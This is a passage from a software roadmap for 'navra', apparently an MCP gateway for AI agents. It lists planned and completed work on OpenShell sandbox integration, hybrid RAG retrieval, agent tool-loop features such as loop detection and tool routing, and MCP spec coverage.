  email, spawn a flow that reads, summarizes, classifies priority,
  and alerts via D-Bus notification if urgent.
- **Slack trigger**: Slack Events API webhook (or RTM for
  self-hosted). Filter by channel/mention, summarize threads,
  flag action items.
- **Calendar trigger**: CalDAV polling (Google Calendar, Nextcloud).
  Pre-meeting: pull context from relevant docs/emails. Post-meeting:
  summarize notes if integrated with transcription.
- **File trigger**: inotify on configured directories. New file
  triggers indexing, classification, or processing flow.

Each trigger maps to a flow template (Phase 2c) with event
payload as parameters. Triggers respect IFC labels (email content
tagged `Confidentiality::Sensitive` at minimum).

**Use case**: "Agent that reads/summarizes/prioritizes/alerts on
email and Slack so I focus on important things."

**Effort**: 3-5 days (core + email trigger). **Priority**: Medium.
**Acceptance**: New email arrives, agent summarizes and sends
D-Bus notification with priority classification.

Reference: Writer Playbook triggers (VentureBeat, 2026-05-08),
Voice assistant voice-first assistant design.

### Phase 6: OpenShell integration ✅

See `docs/designs/openshell-sandbox.md` for full design.

**Goal**: Integrate with OpenShell (Red Hat/NVIDIA secure sandbox
platform) for identity federation, A2A teammate mesh, sandbox
delegation, and gRPC module architecture.

**Status**: Complete (2026-04-25).

#### 6a. OpenShell-provided identity ✅ (2026-04-24)

`OpenShellAuthenticator` in navra-security accepts identity
tokens from the OpenShell supervisor (SPIFFE SVIDs, OIDC JWTs,
or gateway-signed tokens). Slots into `ChainAuthenticator`
between capability and legacy auth. No impact on standalone navra.

#### 6b. A2A client and teammate mesh ✅ (2026-04-24)

`A2aClient` in navra-protocol for outbound A2A calls.
`MeshRouter` in navra-flow routes messages to in-process
(mailbox) or remote (A2A) teammates transparently.
`AgentCardDirectory` in navra-core for teammate discovery.
IFC enforcement on all A2A messages via `X-Navra-DataLabel` header.

#### 6c. Sandbox delegation to OpenShell ✅ (2026-04-24)

Removed aspirational libkrun feature flag. Added `openshell`
runtime backend that delegates sandbox creation to OpenShell's
compute driver via gRPC. Vendored proto definitions at
`navra-model-runtime/proto/`. Direct and Podman backends
remain for standalone navra.

#### 6d. gRPC module architecture ✅ (2026-04-24)

`GrpcModule` adapter implements Module trait by forwarding calls
to gRPC services. `GrpcModuleManager` handles lifecycle (spawn,
health check, restart). Proto definitions at `navra-core/proto/`.
Configured via `grpc_modules` in server config.

#### 6e. Defense-in-depth network security model ✅ (2026-04-25)

Combined OpenShell + navra security model documented and tested:

- OPA policy template: `docs/openshell/opa-sandbox-policy.rego`
- navra config template: `docs/openshell/navra-sandbox.toml`
- Integration tests: `navra-server/tests/openshell_integration.rs`
  (6 tests covering network isolation, ACLs, IFC, identity, tokens, PII)
- MAC + DAC defense in depth section added to DESIGN.md
- Microkernel analogy for Phase 8 papers

**Updated 2026-05-25**: Red Hat Summit validated the Layer 0 + Layer 1
model. OpenShell = Layer 0 (kernel sandbox, cannot inspect MCP request
bodies), navra = Layer 1 (application-layer governance — tool names,
arguments, schemas, IFC). Deconvolute Labs analysis confirms this
architectural split. Claude self-hosted sandboxes (public beta) and
three-mode sandboxing taxonomy (Mode 1/2/3) further validate navra's
position. Red Hat GA'd Zero Trust Workload Identity Manager (SPIFFE/
SPIRE), validating the SPIFFE auth path in OpenShellAuthenticator.
DefenseClaw (Cisco) entered as a Layer 1 competitor but lacks IFC.

#### 6f. MCP tunnel compatibility ✅ (2026-05-26)

**Crate**: `navra-server` (transport)

Verify and document navra as the private MCP server target behind
both Anthropic and OpenAI MCP tunnels:

- **Anthropic tunnel**: Outbound-only HTTPS via Cloudflare with
  three encryption layers (mTLS at tunnel edge, inner TLS to
  customer proxy, OAuth on each MCP server). Claude Managed Agents
  use this in Mode 2 (brain on Anthropic, hands in customer sandbox).
- **OpenAI tunnel**: `tunnel-client` long-polls for queued MCP work,
  forwards locally, returns responses. Harpoon pattern: named
  targets with bounded requests, not arbitrary proxy.
- **Testing**: Set up both tunnel clients pointing at navra,
  verify all MCP methods work through the tunnel. Document any
  latency characteristics or transport quirks.
- **Harpoon validation**: navra's explicit upstream declarations
  in config (not open-ended proxying) match the Harpoon pattern.
  Document this alignment.

navra adds security enforcement that tunnels do not — tunnels
just transport MCP traffic; navra inspects, filters, and governs
it. A tunnel + navra combination provides both transport security
and content-level governance.

**Effort**: 1-2 days. **Priority**: High.
**Acceptance**: Full MCP method coverage through both tunnel clients.
Documented setup guide.

Reference: OpenAI Secure MCP Tunnels (2026-05), Anthropic MCP
Tunnels (Code with Claude, 2026-05-19).

#### 6g. NemoClaw MCP bridge alternative design (NEW — tech watch 2026-05-25)

**Crate**: `navra-server` (documentation + integration test)

Document navra as the architecturally superior alternative to
NemoClaw's per-server MCP bridge pattern (Issue #566):

- **NemoClaw approach**: One stdio-to-HTTP proxy per MCP server,
  each with its own egress rule, spawning server subprocesses on
  the host with API keys from host env.
- **navra approach**: One gateway, one egress rule from the
  sandbox to navra. navra handles multiplexing to upstream
  MCP servers with credential injection, IFC enforcement, and
  safety filtering.
- **Integration test**: Agent inside OpenShell sandbox → one
  egress rule to navra → navra proxies to 3+ upstream MCP
  servers with IFC and safety filtering.
- **MCPS alignment**: Track NemoClaw Issue #204 (cryptographic
  message signing for MCP tool calls). navra's capability tokens
  partially address this — document the overlap.

**Effort**: 1 day (documentation + integration test). **Priority**: Medium.
**Acceptance**: Integration test demonstrates single-gateway pattern
with 3+ upstream servers from inside OpenShell sandbox.

Reference: NemoClaw Issue #566 (MCP bridge), NemoClaw Issue #204
(MCPS signing), Deconvolute Labs OpenShell analysis.

#### 6h. Privacy Router coordination (NEW — tech watch 2026-05-25)

**Crate**: `navra-model` (backend selection)

Define the boundary between OpenShell's Privacy Router (inference
routing via `inference.local`) and navra-model's multi-backend
routing to avoid duplication:

- **Inside sandbox mode**: navra delegates inference routing to
  OpenShell's Privacy Router (use `inference.local` as the model
  endpoint). Privacy Router handles credential injection and
  data sensitivity classification.
- **Standalone mode**: navra retains its own routing via
  navra-model backends (Ollama, OpenAI-compat, Anthropic).
- **Auto-detection**: Use IsolationContext (Phase 8e) to detect
  whether navra is running inside an OpenShell sandbox. If yes,
  default to `inference.local` unless explicitly overridden.

**Effort**: 1 day. **Priority**: Medium.
**Acceptance**: navra inside OpenShell routes model calls through
Privacy Router. Same navra binary works standalone with direct
backend routing.

Reference: OpenShell Privacy Router documentation, Red Hat Summit
2026 announcements.

#### 6i. Kubernetes Agent Sandbox backend (NEW — tech watch 2026-05-28)

**Crate**: `navra-model-runtime`, `navra-tools-exec`

Add Kubernetes Agent Sandbox CRD as a fourth isolation backend
alongside direct, Podman, and OpenShell:

- **SandboxClaim integration**: Map navra capability tokens to
  SandboxClaim creation. Capability delegation authorizes sandbox
  provisioning.
- **SandboxTemplate mapping**: Define security profiles per risk
  tier (navra risk_tier → SandboxTemplate). Low risk = gVisor
  (syscall-level), high risk = Kata Containers (VM-level).
- **SandboxWarmPool**: Pre-warm execution sandboxes for sub-second
  provisioning. Addresses cold-start latency for tool execution.
- **Hibernation**: Pause idle sandboxes to save compute. Resume on
  network activity.
- **Model-runtime isolation**: Add `Kubernetes` variant to the
  Engine×Isolation matrix (LlamaCpp/vLLM × direct/Podman/OpenShell/
  Kubernetes).

Kubernetes-specific — navra also needs local/desktop isolation
(Podman, OpenShell) for non-K8s deployments.

**Research gate**: Is agent-sandbox v1alpha1 stable enough? What's
the API surface we need to depend on?

**Effort**: 3-5 days. **Priority**: Medium.
**Acceptance**: Model-runtime serves a model inside a K8s sandbox
with sub-second provisioning via warm pool.

Reference: kubernetes-sigs/agent-sandbox, GKE Agent Sandbox.

### Phase 7: RAG enhancements

#### 7a. Two-stage retrieval with cross-encoder reranking ✅

Add reranking stage to navra-rag after sqlite-vec retrieval:

- ColBERT-style late interaction (preferred: preindexable, low
  latency, fits ONNX in-process strategy)
- Fallback: MiniLM-L6-v2 cross-encoder as ONNX model
- Domain fine-tuning with hard negatives (~70 examples for
  significant improvement)
- Knowledge distillation: train fast bi-encoder from cross-encoder
  scores for domain-specific use

#### 7b. Semantic query caching (NEW)

Paraphrase-detection model to identify duplicate queries at
retrieval time. ~76% savings on redundant ranking operations.
Particularly valuable in multi-agent flows where agents rephrase
similar queries.

#### 7c. Agentic RAG L2 ✅ (2026-05-29)

**Crate**: `navra-rag` (new `agentic.rs`)

Move from passive retrieval to active, multi-step retrieval:

- **Query decomposition**: Break complex queries into sub-queries
  routed to vector search, FTS5, or upstream MCP resources
- **Self-correction loop**: Evaluate retrieved context relevance
  before sending to the LLM; re-query if below threshold
- **Multi-hop chaining**: Answer requires combining results from
  multiple retrievals (e.g., "find the function that calls X,
  then check its error handling")
- Uses existing `navra-flow` DAG for multi-step orchestration

**Effort**: 3-5 days. **Priority**: High.
**Depends on**: 7a (reranker provides relevance scoring for
self-correction), 7b (caching avoids redundant sub-queries).
**Acceptance**: Multi-hop retrieval test finds correct answer
across 3+ document hops.

#### 7d. Nomic Embed v1.5 evaluation

**Crate**: `navra-model` (OnnxBackend) + `navra-rag` (store)

Evaluate as replacement for current embedding model:

- Matryoshka dimensions: 768 (search) / 1536 / 3072 (re-rank)
- Apache 2.0 license, ONNX export available
- Two-stage retrieval: 768-dim fast search → 3072-dim re-rank
- Also evaluate GeminiEmbedding as cloud-tier fallback
- Benchmark: recall@10 vs current model on project codebase

**Effort**: 2 days. **Priority**: Medium-High.
**Acceptance**: Recall@10 improves or matches at lower latency.

#### 7e. Hybrid FTS5+vector search in ChunkStore ✅ (2026-05-26)

**Crate**: `navra-rag` (store.rs)

Add FTS5 alongside sqlite-vec in the same SQLite database for
hybrid retrieval with RRF fusion — the 2026 production consensus
(+23-40% accuracy over pure vector):

- **New FTS5 table**: `CREATE VIRTUAL TABLE rag_chunks_fts USING
  fts5(content, content=rag_chunks, content_rowid=id)` in the
  same database as `rag_chunk_vectors`.
- **Hybrid search method**: `hybrid_search(&self, query: &str,
  embedding: &[f32], limit: usize)` runs both FTS5 BM25 and
  vec0 similarity in parallel (two SQL queries), fuses with
  RRF (k=60).
- **Performance target**: ZeroClaw demonstrates 0.3ms FTS5 + 2ms
  vector + 0.1ms merge = under 3ms total on a Raspberry Pi Zero 2W.
- **navra-rag gap**: ChunkStore currently does vector-only search.
  FTS5 exists in KnowledgeStore (separate database). Unifying them
  enables true hybrid search.
- **MemoryRetriever already has RRF**: Reuse the same RRF
  implementation (k=60) from `navra-memory`.

**Effort**: 2-3 days. **Priority**: P0 — Critical.
**Acceptance**: Hybrid search returns better results than vector-only
on identifier/error-code queries. Measured via recall@10.

Reference: ZeroClaw hybrid memory, Llama-Stack hybrid API proposal
(Issue #1158), LiteSearch, ceaksan hybrid search guide.

#### 7f. Breadcrumb injection in chunking ✅ (2026-05-26)

**Crate**: `navra-rag` (chunk.rs)

Prepend the full structural path (heading hierarchy) to each chunk
before embedding, giving every chunk positional awareness at zero
model cost:

- **Heading parser**: For Markdown documents, parse `#` headings
  into a hierarchical path. For RST, parse section headers.
  For code files, parse module/class/function hierarchy.
- **Breadcrumb field**: Add `breadcrumb: Option<String>` to the
  `Chunk` struct. Example: `"AMD > Financial Statements > Cash Flows"`.
- **Embedding with breadcrumb**: When generating embeddings, prepend
  breadcrumb to chunk content. The embedding captures both semantic
  content and structural position.
- **Storage**: Store breadcrumb in `rag_chunks` table for retrieval-
  time filtering.

Proxy-Pointer RAG achieved 100% accuracy at k=5 on Fortune 500
10-K filings largely from this single technique. Zero additional
model cost — the breadcrumb is prepended to text, not processed
by a separate model.

**Effort**: 1-2 days. **Priority**: High.
**Acceptance**: Retrieval precision improves on structured documents
(Markdown with headings, code with modules).

Reference: Proxy-Pointer RAG (TDS, 2026-05-20).

#### 7g. Confidence gating on RAG results ✅ (2026-05-26)

**Crate**: `navra-rag` (rerank.rs, module.rs)

After cross-encoder reranking, compute mean relevance score of
top-k results and abstain if below threshold:

- **Mean score computation**: After `CrossEncoderReranker::rerank`,
  compute mean score of top-k results.
- **Confidence gate**: If mean score < configurable threshold
  (default 0.4), return a confidence warning in the tool response
  instead of low-quality context.
- **Abstention pattern**: Return "Insufficient information to
  answer this query" when confidence is below threshold. This is
  the hallucination defense mechanism — the system working
  correctly, not failing.
- **Config**: Add `ConfidenceGate { threshold: f32, abstain_message:
  String }` to RAG module config.

Systems without abstention capability are considered prototypes,
not production systems (2026 consensus).

**Effort**: 0.5-1 day. **Priority**: High.
**Acceptance**: Query with no relevant documents returns abstention
message instead of low-quality results.

Reference: Confidence-Aware RAG (Microsoft TechCommunity),
Production RAG Guide 2026.

#### 7h. Batch cross-encoder scoring ✅ (2026-05-26)

**Crate**: `navra-rag` (rerank.rs)

Change `CrossEncoderReranker::rerank` to batch all `(query, candidate)`
pairs into a single ONNX inference call instead of N sequential calls:

- **Current**: `score_pair` processes one pair at a time. For 20
  candidates, that's 20 ONNX inference calls.
- **Batched**: Concatenate all pairs into a single input tensor
  with batch dimension = N. One ONNX call produces all scores.
- **Latency reduction**: O(N * inference_time) → O(inference_time).
  For 20 candidates at ~5ms/pair, this is 100ms → ~10ms.
- **Dynamic batching**: Handle variable-length inputs with padding
  and attention masks.

**Effort**: 0.5-1 day. **Priority**: Medium-High.
**Acceptance**: Reranking 20 candidates takes <15ms instead of ~100ms.

Reference: BGE reranker batch scoring, Ailog cross-encoder study.

#### 7i. Section-level pointer retrieval ✅ (2026-05-26)

**Crate**: `navra-rag` (store.rs, chunk.rs)

Store the parent section byte range alongside chunk byte range.
On retrieval, return the full intact section content instead of
the chunk fragment:

- **Storage**: Add `section_start_byte INTEGER, section_end_byte
  INTEGER` to `rag_chunks` table (byte range of the heading-to-
  next-heading section containing this chunk).
- **Retrieval**: After vector/hybrid search identifies relevant
  chunks, load the full parent section from the original document
  instead of the chunk text.
- **Deduplication**: Multiple chunks from the same section are
  deduplicated to a single section in the results.
- **LLM context**: The LLM receives complete, unbroken document
  sections rather than truncated fragments. This is the core
  Proxy-Pointer insight.

**Effort**: 1-2 days. **Priority**: Medium-High.
**Depends on**: 7f (breadcrumb injection provides heading structure).
**Acceptance**: Retrieved context contains complete sections, not
truncated chunks. LLM answers are more accurate on structured docs.

Reference: Proxy-Pointer RAG pointer-based context.

#### 7j. Metadata pre-filtering ✅ (2026-05-26)

**Crate**: `navra-rag` (store.rs)

Add structured metadata columns to `rag_chunks` for pre-filtering
before vector search (filter before scoring, not after):

- **New columns**: `doc_type TEXT`, `updated_at INTEGER`,
  `tags_json TEXT` in `rag_chunks`.
- **SearchFilter struct**: Optional constraints on doc_type,
  time range, tags. Applied as SQL WHERE clauses before the
  vec0 MATCH operation.
- **Scoped search**: "Search only in code files", "search documents
  modified in the last 7 days", "search only tagged 'security'".
- **Consistency**: `MemoryRetriever` already has `search_scoped` —
  extend the same pattern to the RAG layer.

**Effort**: 0.5-1 day. **Priority**: Medium.
**Acceptance**: Scoped RAG search on doc_type returns results from
matching documents only.

Reference: Context-Aware Search (Machine Learning Mastery),
Context Engine library.

#### 7k. HyDE retrieval channel (NEW — tech watch 2026-05-28) ✅ (2026-05-29)

**Crate**: `navra-rag` (search.rs)

Add Hypothetical Document Embeddings (HyDE) as a third retrieval
channel alongside FTS5 and vector search in the RRF fusion pipeline:

- **HyDE**: Generate a declarative answer to the query before vector
  search. Embed the hypothetical answer and search against stored
  chunks. Catches vocabulary mismatches where the query and relevant
  chunks use different terminology.
- **Integration**: Add as third channel in RRF fusion (FTS5 + vector
  + HyDE). The existing `3x overfetch` pattern applies per channel.
- **Local model**: Use in-process ONNX model for HyDE generation
  (small, fast). Fall back to direct vector search if generation
  fails or latency exceeds budget.

Validated by Cloudflare Agent Memory (5-channel RRF with HyDE) and
gBrain (97.6% top-5 retrieval with similar hybrid architecture).

**Effort**: 1-2 days. **Priority**: Medium.
**Acceptance**: HyDE channel improves recall on vocabulary-mismatch
queries. Latency stays within 100ms budget.

Reference: Cloudflare Agent Memory (2026-04), gBrain HyDE pattern.

#### 7l. TurboVec evaluation (NEW — tech watch 2026-05-28)

**Crate**: `navra-rag` (store.rs)

Evaluate TurboVec as replacement for sqlite-vec in the vector search
backend. TurboVec is a Rust vector index using Google's TurboQuant
data-oblivious quantization algorithm:

- **Memory**: 16x compression (float32 → 2-bit). 10M vectors: 31GB
  to 4GB. Current sqlite-vec stores full float32 embeddings.
- **Speed**: 12-20% faster than FAISS IndexPQFastScan on ARM.
  SIMD-accelerated via NEON/AVX-512BW/AVX2.
- **Zero training**: Data-oblivious quantization with analytically
  precomputed codebooks. Matches navra-rag's append-oriented
  pattern (incremental `index_document()` adds).
- **Swap feasibility**: RRF fusion layer is vector-backend-agnostic.
  Cache layer (cosine similarity 0.92, TTL 300s) works with either.
  Only the search interface needs implementing.

**Research gate**: Benchmark on navra-rag's actual workload
(breadcrumb chunks, cross-encoder reranking). Compare recall and
latency at 10K-100K vectors.

**Effort**: 2-3 days (eval). **Priority**: Medium.
**Acceptance**: TurboVec matches sqlite-vec recall within 1 point
at 10x+ memory reduction.

Reference: TurboVec (cargo add turbovec), TurboQuant (Google
Research, arXiv:2504.19874).

#### 7m. Adaptive chunking quality metrics (NEW — tech watch 2026-05-28) ✅ (2026-05-29)

**Crate**: `navra-rag` (chunk.rs)

Add document-aware chunking quality metrics from the Adaptive
Chunking paper (arXiv:2603.25333, LREC 2026). Current breadcrumb
chunking uses a single strategy for all documents:

- **Block Integrity (BI)**: Verify tables, lists, and code blocks
  are not split mid-block. Currently breadcrumb chunking can break
  structured content.
- **Intrachunk Cohesion (ICC)**: Measure semantic coherence within
  each chunk using embedding similarity. Low-cohesion chunks should
  be re-split or merged.
- **Document-type-aware strategy**: Different chunking for code
  files (AST-aware), markdown (heading-aware, already done), legal
  (section-aware), and tabular data (row-aware).

Do NOT add the LLM-regex splitter — conflicts with local-first,
low-latency design. Keep breadcrumb as default; add document-type
detection to select strategy.

**Effort**: 2-3 days. **Priority**: Medium.
**Acceptance**: Structured documents (tables, code) chunked without
mid-block splits. BI metric passes on 95%+ of chunks.

Reference: Adaptive Chunking (arXiv:2603.25333, Ekimetrics,
LREC 2026).

### Phase 8: Warp-informed UX patterns (NEW — 2026-05-04)

Patterns adopted from studying Warp's open-source codebase
(github.com/warpdotdev/warp, AGPL-3.0). All items are clean-room
re-implementations of design patterns, not code copies.

#### 8a. Typed agent action/result model ✅ (2026-05-05)

Adopt Warp's action/result enum symmetry pattern for `navra-agent`.
Currently, tool results are flat `CallToolResult` (text content +
is_error). A typed model enables better rendering, auto-approval,
cancellation, and audit:

- `AgentAction` enum: `FileRead`, `FileWrite`, `GitStatus`,
  `GitCommit`, `RagSearch`, `ShellCommand`, `McpToolCall`,
  `StartAgent`, `SendMessage`, `AskUser`, etc.
- `AgentActionResult` enum: mirrors each action with
  Success/Error/Cancelled variants.
- Metadata methods: `is_read_only()`, `risk_level()`,
  `user_friendly_name()`, `cancelled_result()`.
- Wire into permission engine: `navra-security` ACL decisions
  use `risk_level()` for auto-approval thresholds.
- Audit: structured entries in blackbox log (action type, args,
  result, timing, risk classification).

**Effort**: 2-3 days. ~500 lines in navra-agent + wiring.

#### 8b. MCP config import ✅ (2026-05-05)

Let users import upstream MCP server configs from existing tools
without maintaining separate navra config:

- Parse Claude Desktop format (`.mcp.json` with `mcpServers` key)
- Parse VSCode format (`mcp.servers` key)
- Parse Codex TOML format (`[mcp_servers.name]` tables)
- Normalize all to navra's `[[upstream]]` config entries
- CLI: `navra config import-mcp <path>` to merge into config.toml
- Auto-discovery: scan `~/.claude.json`, `.mcp.json` in project root
- Secret-safe: `#[serde(skip_serializing)]` on credential fields
  to prevent accidental exposure in config dumps.

**Effort**: 1 day. ~200 lines in navra-server/src/config.rs.

#### 8c. Config schema generation (MEDIUM priority)

Generate JSON Schema from navra config types for editor
autocomplete in TOML files:

- Add `schemars::JsonSchema` derives to config structs
- CLI: `navra schema > config.schema.json`
- Hot-reload: file watcher on `config.toml`, update in-memory
  config without restart (load-only, no write-back loop)
- Validate on load with defaults for invalid values

**Effort**: 1 day. Add derives + 50-line CLI subcommand.

#### 8d. Computer use Actor trait (MEDIUM priority)

Clean platform abstraction for `navra-modal-vision`:

- `Actor` trait: `async fn perform_actions(&mut self, actions: &[Action]) -> ActionResult`
- `Action` enum: `Wait`, `MouseDown/Up/Move`, `TypeText`, `KeyDown/Up`
- Platform auto-detection: check `WAYLAND_DISPLAY` / `DISPLAY` env vars
- `ScreenshotParams`: `max_long_edge_px`, `max_total_px` for LLM-friendly sizing
- Use `xcap` (MIT) for actual capture, not Warp's XDG portal code

**Effort**: 2 days. ~300 lines in navra-modal-vision.

#### 8e. Isolation context detection (MEDIUM priority)

Detect runtime isolation environment for OpenShell integration:

- `IsolationContext` struct: detect Podman container, libkrun VM,
  OpenShell sandbox, bare metal via env vars + cgroup heuristics
- Layered detection: explicit env var > heuristic checks
- Workload token abstraction for identity federation
- Memoize with `OnceLock` for process lifetime

**Effort**: 0.5 day. ~100 lines in navra-model-runtime.

#### 8f. ToolBlock structured output (LOW-MEDIUM priority)

Block-based tool execution model for future CLI/TUI:

- `ToolBlock`: `block_id: Uuid`, `tool_name`, `arguments`,
  `result: CallToolResult`, `started_at`, `duration`, `status`
- Each tool execution produces one addressable block
- Blocks carry metadata for rendering (exit code, timing, risk)
- Foundation for eventual terminal-style agent UX

**Effort**: 1 day. ~150 lines in navra-agent.

#### 8g. Intent-based tool grouping

**Crate**: `navra-core` (server, dispatch) + `navra-agent` (tool_loop)

Reduce tool count per request for small models that struggle with
large tool lists:

- Group fine-grained tools into intent-based tools: `file_read` +
  `file_write` + `file_edit` → `file_operate(op, path, ...)`
- Semantic tool discovery: embed tool descriptions at startup,
  match against query, expose only relevant subset to the model
- Config: `[server] tool_grouping = "none" | "intent" | "semantic"`
- Backward compatible — ungrouped mode remains the default

**Effort**: 2-3 days. **Priority**: Medium-High.
**Acceptance**: Small models (≤10B) succeed at tool calling with
grouped tools where they previously failed with 40+ individual tools.

#### 8h. Multi-hypothesis tool routing (NEW)

Use verbalized sampling to improve tool selection in navra-flow
and navra-agent tool loops:

- Instead of the LLM picking one tool, prompt for 3 ranked
  candidates with confidence scores and rationale
- The router applies permissions/IFC checks to each candidate
  in rank order, executing the first viable one
- Reduces re-prompting on permission denials (currently the LLM
  picks a tool, gets denied, re-reasons, picks another — wastes
  iterations and tokens)
- Config: `tool_routing = "single" | "ranked"` (default: single)
- Adds ~200 tokens per tool selection but saves full re-prompt
  cycles on denial (~2000+ tokens each)

**Effort**: 1-2 days. **Priority**: Low.
**Acceptance**: Permission denial triggers fallback to next-ranked
tool without re-prompting the model.

Reference: Verbalized sampling (2026-05-03) — multi-hypothesis
output with confidence scores for decision-making.

#### 8i. Progressive tool disclosure ✅

**Crate**: `navra-core` (server, dispatch)

Filter the tool list returned by `tools/list` based on session
state, declared skills, or query context. Currently navra loads
all module tools at startup and exposes all to every agent.

- **Session-scoped tool sets**: A `tools_filter` hook that reduces
  the tool list based on agent capabilities, current workflow
  stage, or explicit skill declarations
- **Skill-based progressive disclosure**: Inspired by Genkit's
  Skills middleware and Osmani's harness engineering — tools
  become available as the agent demonstrates need or enters a
  relevant workflow phase
- **Intent-based fallback**: When the agent queries for a tool not
  in its current set, expand the set dynamically rather than
  returning an error

This is infrastructure-layer work that fits the gateway role.
It complements Phase 8g (intent-based tool grouping) — grouping
reduces tool count per request, disclosure controls which tools
are available at all.

**Effort**: 1-2 days. **Priority**: Medium.
**Acceptance**: Agent in "read-only" mode sees only read tools in
`tools/list`. Entering "edit" mode expands the visible tool set.

Reference: Genkit Skills middleware (2026-05), Osmani harness
engineering (O'Reilly Radar, 2026-05).

#### 8j. Loop detection middleware ✅ (2026-05-26)

**Crate**: `navra-agent` (tool_loop.rs)

Add per-tool-per-target counters in the tool loop to detect
repetitive behavior and inject course-correction context:

- **Counter**: Track `(tool_name, primary_arg)` pairs across
  iterations. Example: `(file_edit, "src/main.rs")` count = 5.
- **Threshold**: After N calls to the same tool with similar
  arguments (default N=3), inject a "reconsider your approach"
  context message into the next prompt.
- **Progressive escalation**: N+2 → stronger warning. N+4 → force
  different tool selection. N+6 → abort loop.
- **ActionRecord integration**: The existing `ActionRecord` already
  tracks tool calls — add per-target counting on top.

LangChain measured 13.7-point improvement (52.8% → 66.5%) with
this pattern on Terminal Bench 2.0.

**Effort**: 0.5-1 day. **Priority**: Medium.
**Acceptance**: Agent editing the same file 4+ times gets a
"reconsider" injection. Loop terminates instead of spinning.

Reference: LangChain harness engineering, WebWright loop detection.

#### 8k. Reasoning compute allocation ✅ (2026-05-26)

**Crate**: `navra-agent` (tool_loop.rs)

Add a `reasoning_phase` field to `ToolLoopConfig` that maps
iteration ranges to temperature/reasoning levels:

- **Phase definition**: `phases: [{range: "1-2", temp: 0.1,
  reasoning: "high"}, {range: "3-N", temp: 0.0, reasoning: "low"},
  {range: "final", temp: 0.1, reasoning: "high"}]`
- **Reasoning sandwich**: High reasoning for planning iterations,
  low for execution, high for verification. Validated: xhigh/high/
  xhigh = 66.5% vs all-xhigh 53.9% (LangChain).
- **Integration**: The Weaver's `assemble_with_phase` already
  supports planning/execution phases. Extend with per-iteration
  temperature overrides.

**Effort**: 0.5-1 day. **Priority**: Medium.
**Acceptance**: Tool loop uses different temperatures for planning
vs execution iterations.

Reference: LangChain reasoning sandwich, NVIDIA financial signal
discovery (temp 0.8/0.0/0.5).

#### 8l. Dynamic tool routing per request (NEW — tech watch 2026-05-28) ✅ (2026-05-29)

**Crate**: `navra-core` (server.rs), `navra-protocol`

Surface only relevant tools per request instead of exposing all
`RegisteredTools` via HashMap. Inspired by Composio's Tool Router:

- **Intent-based filtering**: Classify agent request intent (read,
  write, search, communicate) and filter tools/list response to
  only relevant tools. Reduces prompt token usage and confusion.
- **Agent-scoped views**: Different agents see different tool sets
  based on their capability tokens and current session state.
- **IFC-gated tools**: Tools that would violate IFC labels for the
  current session context are hidden from tools/list, not just
  denied at call time.
- **ttlMs integration**: When MCP 2026-07-28 ships, use the new
  caching metadata (ttlMs/cacheScope) to indicate tool list
  stability.

Composio's 28.4K stars validate demand for intelligent tool routing
in MCP gateways. Currently navra exposes all tools — the closest
gateway competitor with this feature.

**Effort**: 2-3 days. **Priority**: Medium.
**Acceptance**: Agent in a read-only workflow sees only read tools
in tools/list. Write tools appear when intent changes.

Reference: Composio Tool Router, Open-Source Agent Toolkit
Landscape 2026.

### Phase 9: Full MCP spec coverage (2026-05-04, mostly complete)

**Goal**: navra-protocol covers 100% of the MCP 2025-03-26 spec,
including proc macros for third-party module authors. Competitive
parity with rmcp (official Rust MCP SDK, 4.7M downloads) while
maintaining our differentiators (IFC labels, permissions extension,
A2A client, resilient upstream proxy).

**Current coverage**: ~35/39 features. Remaining: completion/complete,
logging/setLevel, resources/subscribe+unsubscribe (4 methods not dispatched).

#### 9a. Missing types — batch 1 ✅ (2026-05-05)

Add missing fields and types that are <50 lines each:

| Feature | What to add | Lines |
|---------|------------|-------|
| `ping` | Match arm in dispatch returning `{}` | 5 |
| `instructions` field | `Option<String>` on `InitializeResult` | 2 |
| Tool annotations | `ToolAnnotations` struct (readOnlyHint, destructiveHint, idempotentHint, openWorldHint, title) + field on `ToolDefinition` | 20 |
| Resource size | `Option<u64>` on `ResourceDefinition` | 2 |
| Image content | `Content::Image { data, mime_type }` | 10 |
| Audio content | `Content::Audio { data, mime_type }` | 10 |
| Embedded resource | `Content::Resource { resource: ResourceContent }` | 10 |
| MCP error codes | Named constants: `RequestCancelled = -32001`, `ContentTooLarge = -32002` | 10 |
| Roots types | `Root { uri, name }`, `ListRootsResult` | 15 |
| Cancellation | `CancelledNotification { request_id, reason }` | 15 |
| Progress notification | `ProgressNotification { progress_token, progress, total, message }` | 15 |

**Effort**: 1 day. ~115 lines of types + tests.

#### 9b. Missing types — batch 2 ✅ (2026-05-05)

| Feature | What to add | Lines |
|---------|------------|-------|
| Logging | `LoggingCapability`, `SetLevelParams`, `LoggingLevel` enum (8 syslog levels), `LoggingMessageNotification` | 60 |
| Sampling | `CreateMessageParams`, `CreateMessageResult`, `ModelPreferences`, `ModelHint`, `SamplingMessage` | 100 |
| Completions | `CompleteParams`, `CompleteResult`, `PromptReference`, `ResourceReference` | 50 |
| Elicitation | `CreateElicitationParams`, `ElicitationResult`, `ElicitationSchema` | 60 |
| Resource templates | `ResourceTemplate` struct + `ListResourceTemplatesResult` | 30 |

**Effort**: 2 days. ~300 lines of types + tests.

#### 9c. Pagination infrastructure ✅ (2026-05-05)

Generic pagination pattern for all list operations:

- `PaginatedParams { cursor: Option<String> }` trait or struct
- `PaginatedResult<T> { items: Vec<T>, next_cursor: Option<String> }`
- Add cursor fields to: `ListToolsResult`, `ListResourcesResult`,
  `ListPromptsResult`, `ListResourceTemplatesResult`
- Add cursor param to list request params
- Server-side: page through module tool registrations (currently
  returns all at once — fine for now, but needed for spec compliance)

**Effort**: 1 day. ~100 lines.

#### 9d. Notification infrastructure ✅ (2026-05-05)

Server-initiated notifications over SSE. This is the biggest
structural gap — blocks 5 features:

- Notification bus: `tokio::broadcast` channel in session state
- `notify()` method on session: serialize notification, push to SSE stream
- Implement: `notifications/tools/list_changed`,
  `notifications/resources/list_changed`,
  `notifications/resources/updated`,
  `notifications/prompts/list_changed`,
  `notifications/progress`
- Module trait gains `on_change(&self) -> broadcast::Receiver<Notification>`
- Resource subscription store: track which resources each session
  has subscribed to, emit `resources/updated` on change

**Effort**: 3 days. ~400 lines across navra-core + navra-protocol.

#### 9e. Progress tracking ✅ (2026-05-05)

Request-level progress reporting:

- `RequestMeta { progress_token: Option<ProgressToken> }` on all
  request params (tools/call, resources/read, prompts/get)
- Module handlers receive progress token, can emit
  `notifications/progress` via notification bus (9d)
- Wire into long-running tools (RAG indexing, file operations)

**Effort**: 1 day. ~100 lines. Depends on 9d.

#### 9f. Stdio server transport ✅ (2026-05-05)

